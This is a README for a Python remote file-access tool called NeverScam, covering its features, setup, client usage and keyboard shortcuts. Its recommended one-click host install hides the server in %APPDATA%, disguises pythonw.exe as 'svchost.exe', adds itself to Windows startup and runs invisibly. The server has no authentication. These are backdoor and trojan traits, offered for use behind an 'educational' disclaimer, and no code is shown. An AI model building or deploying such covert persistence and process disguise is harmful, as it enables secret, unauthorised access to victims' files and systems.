# NeverScam Remote File Access Tool

A client-server application that allows remote access to files on a host computer from a user's device, providing a desktop-like file management experience.

## Features

- **Remote File Management**: View, edit, create, delete, rename, and copy files and folders remotely
- **Directory Navigation**: Tree view for browsing directories and list view for files
- **File Editing**: Built-in text editor for viewing and modifying text files
- **File Operations**: Upload local files to remote server, download remote files
- **Search Functionality**: Search for files and directories
- **File Properties**: View file size, modification date, and other properties
- **Themes**: Light and dark theme support
- **Context Menu**: Right-click menu for quick actions
- **Keyboard Shortcuts**: Common shortcuts for efficient navigation

## Requirements

- Python 3.6+
- For host (server): Only Python required - no external dependencies needed (uses built-in modules only)
- For client: Windows (for .exe), or any OS with Python for testing
- Dependencies: Pillow (for image preview), PyInstaller (for building .exe) - only for the client

## Installation

### One-Click Host Setup (Recommended)

1. Download the repository
2. On the host computer, double-click `auto-install.bat`
3. That's it! The server will:
   - Install to a hidden location (%APPDATA%\NeverScam)
   - Copy pythonw.exe as "svchost.exe" to disguise the process
   - Add to Windows startup registry
   - Start immediately hidden

**Note:** After installation, no files or applications are visible. The server runs completely hidden (appears as "svchost.exe" in Task Manager) and starts automatically on every boot.

### Manual Setup (Alternative)

1. Clone or download the repository
2. Run `install.py` or `setup.bat` on the host computer
3. Note the IP address of the host computer (e.g., 192.168.1.100)

### Client Installation

1. Install dependencies for the client:
   ```
   pip install -r requirements.txt
   ```

### Running the Client

The client connects to the server and provides the GUI for file management.

#### Option 1: Run as Python script (for testing)

1. On the client computer, run:
   ```
   python main.py
   ```

2. In the connection dialog, enter:
   - Host: IP address of the server (e.g., 192.168.1.100)
   - Port: 12345

3. Click "Connect" to access remote files

#### Option 2: Build and run as Windows .exe

1. On a Windows computer, install dependencies:
   ```
   pip install -r requirements.txt
   ```

2. Build the executable:
   ```
   pyinstaller --onefile --windowed main.py
   ```

3. The `main.exe` file will be created in the `dist` folder

4. Run `main.exe` and connect to the server as described above

### File Operations

- **Navigation**: Use the tree view on the left to browse directories, click to select
- **View Files**: Double-click files in the list to open in the text editor
- **Edit Files**: Modify content in the text editor and save
- **Create**: Use menu File > New File/Folder or buttons
- **Delete**: Select item and press Delete key or use context menu
- **Rename**: Select item and use F2 or context menu
- **Copy/Paste**: Select item, copy, then paste in another directory
- **Upload**: Use File > Upload to send local files to remote server
- **Search**: Type in search box to filter files
- **Properties**: Right-click > Properties to view file details

### Keyboard Shortcuts

- Ctrl+N: New file
- Ctrl+Shift+N: New folder
- Ctrl+O: Open file
- Ctrl+S: Save file
- F2: Rename
- Delete: Delete item
- Ctrl+C: Copy
- Ctrl+V: Paste
- Ctrl+F: Focus search

## Security

- The server only allows access to files within the user's home directory
- All paths are sanitized to prevent directory traversal attacks
- No authentication is implemented - use at your own risk on secure networks
- For production use, consider adding authentication and encryption

## Troubleshooting

- **Connection failed**: Check server IP, port, and firewall settings
- **Permission denied**: Server may not have access to certain directories
- **Binary files**: Only text files can be edited/uploaded; binary files show as images if possible
- **Server not responding**: Ensure server.py is running and port is open

## Development

- Server: `server.py` - Lightweight socket server
- Client: `main.py` - Tkinter GUI application
- Dependencies: `requirements.txt`
- Tasks: `TODO.md`

## License

This project is for educational purposes. Use responsibly.
